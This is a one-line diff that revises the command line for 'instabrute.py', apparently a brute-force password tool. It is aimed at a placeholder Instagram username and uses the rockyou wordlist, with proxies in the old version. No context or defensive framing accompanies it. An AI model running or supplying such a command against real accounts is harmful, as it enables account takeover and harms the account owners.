@@ -1,1 +1,1 @@
-python3 instabrute.py --url https://www.instagram.com/accounts/login/ --username TARGETUSERNAME --wordlist /path/rockyou.txt --proxies proxy.txt 
+python3 instabrute.py -u TARGETUSERNAME -w /path/rockyou.txt -p
